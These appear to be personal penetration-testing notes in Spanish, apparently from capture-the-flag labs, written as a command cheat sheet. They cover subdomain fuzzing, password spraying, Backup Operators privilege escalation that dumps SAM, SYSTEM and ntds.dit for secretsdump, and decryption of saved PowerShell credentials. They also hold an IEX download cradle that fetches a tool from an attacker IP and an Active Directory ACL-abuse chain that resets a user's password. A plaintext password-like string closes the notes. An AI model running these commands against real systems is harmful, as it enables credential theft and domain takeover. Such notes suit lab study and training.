En bash el operador == si la variable de la derecha no está entre comillas pueden usarse wildcards y bruteforcear la variable de la izquierda:
$var1 == $var2 Si $var1 es hola si la $var2 le asignamos el valor asterisco (*) cumplirá la igualdad porque no está entrecomillada la de la derecha.

PASAR AL OBSIDIAN.

SIEMPRE HAY QUE FIJARSE EN LAS RUTAS ABSOLUTAS Y RELATIVAS DE LOS SCRIPTS QUE SE EJECUEN YA SEA DE FORMA MANUAL O POR AUTOMATIZACIONES YA QUE PODEMOS LLEGAR A MANIPULARLOS O SUSTITUIRLOS.
REVISAR SI HAY DIRECTORIOS .git

Si falla el virtual hosting con gobuster podemos utilizar el siguiente comando de Wfuzz:

wfuzz -u http://pandora.htb -H "Host: FUZZ.pandora.htb" -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

gpg --import <key> # Importar claves gpg

gpp -d -o <fichero_final> <ficher_gpg> # Desencriptar fichero gpg

ssh -L <PUERTO_LOCAL>:localhost:<PUERTO_REMOTO> user@server

en AD querydispinfo puede dar también bastante información por los comentarios

### PASSWORD SPRAYING ###

crackmapexec smb <IP> -u <USUARIO/LISTA> -p <CONTRASEÑA>

SIEMPRE HACER EN WINDOWS SI NO SE ENCUENTRA NADA --> ls -force para poder ver archivos ocultos

### PRIVESC BACKUP OPERATORS ###

echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append

diskshadow.exe /s c:\temp\diskshadow.txt

robocopy /b Z:\Windows\System32\Config C:\temp SAM
robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM

download .\SAM /opt/Juggernaut/JUGG-Backup/SAM
download .\SYSTEM /opt/Juggernaut/JUGG-Backup/SYSTEM

secretsdump.py -sam SAM -system SYSTEM LOCAL

En caso de que no funcione con la SAM deberemos usar en NTDS

robocopy /b Z:\Windows\ntds . ntds.dit
reg save hklm\system c:\temp\system.bak

download ntds.dit
download system

### DECRYPT POWERSHELL CREDENTIALS ###

powershell -c "$credentials = Import-Clixml -Path .\cred.xml;$credentials.GetNetworkCredential().password"

### DOWNLOAD FILE ###

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/SharpHound.exe')

### PERMISOS WRITE OWNER SOBRE USUARIO/GRUPO ###

Set-DomainObjectOwner -identity claire -OwnerIdentity tom 

Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword 

$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred

Ahora nos podemos loggear con las credenciales que hemos registrado

### PARA VER LOS PERMISOS ###

icacls <nomnbre archivo/carpeta>

R4v3nBe5tD3veloP3r\!123

